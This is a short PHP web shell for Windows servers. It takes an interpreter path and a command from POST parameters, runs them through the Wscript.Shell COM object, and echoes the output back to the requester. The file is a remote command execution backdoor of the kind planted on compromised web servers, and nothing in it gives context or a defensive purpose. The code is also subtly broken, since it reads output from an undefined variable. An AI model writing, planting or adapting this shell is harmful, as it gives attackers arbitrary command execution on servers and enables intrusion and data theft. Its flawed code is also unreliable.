<?php
$wcpth=$_POST['wcpth'];
$wcmd=$_POST['wcmd'];
if($_POST['do']=='do'){
	$ww=$wcpth." /c ".$wcmd;
	$phpwsh=new COM("Wscript.Shell");
	$phpexec=$phpwsh->exec($ww);
	$execoutput=$wshexec->stdout();
	$result=$execoutput->readall();
	echo $result;
}

?>